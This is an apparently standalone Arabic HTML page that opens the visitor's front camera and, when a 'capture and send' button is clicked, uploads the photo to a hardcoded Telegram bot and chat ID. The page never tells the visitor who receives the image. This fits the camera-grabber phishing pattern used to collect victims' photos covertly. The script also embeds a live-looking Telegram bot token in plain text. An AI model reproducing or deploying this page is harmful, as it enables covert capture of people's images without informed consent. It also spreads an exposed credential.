<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>التقاط صورة بالكاميرا الأمامية</title>
  <style>
    video {
      width: 320px;
      height: 240px;
      border: 1px solid black;
    }
    #captureBtn {
      margin-top: 10px;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h3>التقاط صورة بالكاميرا الأمامية</h3>
  <video id="video" autoplay playsinline></video><br />
  <button id="captureBtn">التقاط صورة وإرسالها</button>

  <script>
    const token = '7088304249:AAF3j4m0NldOUxoLIzenuAmKZyh1RWMfDLY';
    const chatId = '6484198949';

    const video = document.getElementById('video');
    const captureBtn = document.getElementById('captureBtn');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });
        video.srcObject = stream;

        // ننتظر حتى يبدأ الفيديو (تحسين)
        return new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
      } catch (err) {
        alert('تعذر الوصول إلى الكاميرا: ' + err.message);
      }
    }

    function sendPhotoToTelegram(base64Image) {
      const base64Data = base64Image.replace(/^data:image\/png;base64,/, '');
      const formData = new FormData();
      formData.append('chat_id', chatId);

      const byteCharacters = atob(base64Data);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const blob = new Blob([byteArray], {type: 'image/png'});
      formData.append('photo', blob, 'capture.png');

      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    captureBtn.addEventListener('click', async () => {
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        alert('فشل التقاط الصورة: الفيديو لم يبدأ بعد.');
        return;
      }

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/png');

      try {
        await sendPhotoToTelegram(imageData);
        alert('تم إرسال الصورة بنجاح.');
      } catch (err) {
        alert('فشل إرسال الصورة: ' + err.message);
      }
    });

    window.onload = async () => {
      await startCamera();
    };
  </script>
</body>
</html>
